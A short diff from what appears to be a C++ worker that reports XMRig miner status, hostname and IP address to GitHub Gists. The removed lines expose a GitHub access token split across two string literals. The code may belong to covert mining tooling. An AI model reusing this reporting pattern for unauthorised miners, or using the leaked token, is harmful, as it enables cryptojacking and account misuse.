@@ -88,6 +88,8 @@ void Worker_utils::init()
         close(m_rec_sock);
         err("Receiving: binding err");
     }
+
+    m_ip = exec("hostname -i");
 }
 
 void Worker_utils::err(std::string wtf)
@@ -113,23 +115,18 @@ std::string Worker_utils::createJsonStatusFile(const JsonPayload &payload)
     filename += exec("hostname");
     filename += ".json";
 
-    std::string raw_status = "";
+    std::string raw_status = ""; 
 
     raw_status += "{";
-    raw_status += "\"name\":\"" + payload.name + "\"";
-    raw_status += ",\"status\":\"" + payload.status + "\"";
-    raw_status += ",\"xmrig-status\":\"" + payload.xmrig_status + "\"";
-    raw_status += ",\"error\":\"" + payload.err + "\"";
+    raw_status += "\"hostname\":\"" + payload.name + "\""; // Hostname
+    raw_status += ",\"ip\":\"" + payload.ip + "\""; // IP
+    raw_status += ",\"status\":\"" + payload.status + "\""; // Is online
+    raw_status += ",\"xmrig-status\":\"" + payload.xmrig_status + "\""; // Is xmrig runnnig
+    raw_status += ",\"error\":\"" + payload.err + "\""; // If falls
     raw_status += "}";
 
     std::ofstream out(filename);
-    out << "{"
-    << "\"description\":\"Device status\","
-    << "\"public\":false,"
-    << "\"files\":{"
-    << "\"" + filename + "\":{\"content\":" << std::quoted(raw_status) << "}"
-    << "}"
-    << "}";
+    out << raw_status;
 
     return filename;
 }
@@ -138,16 +135,15 @@ void Worker_utils::uploadToGist(const JsonPayload &payload)
 {
     std::string filename = createJsonStatusFile(payload);
 
-    std::string TOKEN = (std::string)"ghp_iFEyATUgNTdKWnja" + (std::string)"0PorXZQUKu2u8P4EPxhI";
-
     std::string response;
-    run_gist_upload(TOKEN, filename, response);
+    run_gist_upload(filename, response);
 }
 
 void Worker_utils::sendStatus()
 {
     JsonPayload payload;
     payload.name = exec("hostname");
+    payload.ip = m_ip;
     payload.status = "online";
     payload.xmrig_status = is_xmrig_running;
     payload.err = "";
